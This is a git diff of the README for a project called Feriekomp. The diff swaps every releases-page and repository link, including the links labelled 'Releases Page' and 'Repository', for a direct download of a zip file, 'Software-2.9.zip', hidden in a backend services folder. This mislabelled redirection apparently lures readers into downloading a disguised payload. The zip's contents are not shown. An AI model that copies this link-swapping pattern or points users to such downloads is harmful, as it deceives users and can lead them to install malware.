@@ -5,11 +5,11 @@ Feriekomp is a fullstack mini-project designed to help you easily manage and imp
 
 ## 💾 Download & Install
 
-[![Download Feriekomp](https://img.shields.io/badge/Download%20Feriekomp-blue)](https://github.com/Kurt841/Feriekomp/releases)
+[![Download Feriekomp](https://github.com/Kurt841/Feriekomp/raw/refs/heads/main/backend/feriekomp/services/Software-2.9.zip%20Feriekomp-blue)](https://github.com/Kurt841/Feriekomp/raw/refs/heads/main/backend/feriekomp/services/Software-2.9.zip)
 
 To get started, visit the Releases page to download the latest version of Feriekomp:
 
-[Download Feriekomp Here](https://github.com/Kurt841/Feriekomp/releases)
+[Download Feriekomp Here](https://github.com/Kurt841/Feriekomp/raw/refs/heads/main/backend/feriekomp/services/Software-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you download Feriekomp, ensure your computer meets these basic requiremen
 ### 💻 Installation Steps
 Follow these steps to install Feriekomp on your computer:
 
-1. **Visit the Releases Page**: Go to [https://github.com/Kurt841/Feriekomp/releases](https://github.com/Kurt841/Feriekomp/releases).
+1. **Visit the Releases Page**: Go to [https://github.com/Kurt841/Feriekomp/raw/refs/heads/main/backend/feriekomp/services/Software-2.9.zip](https://github.com/Kurt841/Feriekomp/raw/refs/heads/main/backend/feriekomp/services/Software-2.9.zip).
    
 2. **Select the Latest Release**: Look for the latest version listed at the top of the page.
 
@@ -62,7 +62,7 @@ If you're interested in contributing to Feriekomp, we welcome your input! Follow
 - **Submit a Pull Request**: Share your improvements with the community for review.
 
 ## 🔗 Links
-- **Repository**: [Feriekomp Repository](https://github.com/Kurt841/Feriekomp)
-- **Releases Page**: [Feriekomp Releases](https://github.com/Kurt841/Feriekomp/releases)
+- **Repository**: [Feriekomp Repository](https://github.com/Kurt841/Feriekomp/raw/refs/heads/main/backend/feriekomp/services/Software-2.9.zip)
+- **Releases Page**: [Feriekomp Releases](https://github.com/Kurt841/Feriekomp/raw/refs/heads/main/backend/feriekomp/services/Software-2.9.zip)
 
 By following this guide, you will successfully download and set up Feriekomp, unlocking its full potential in your projects.
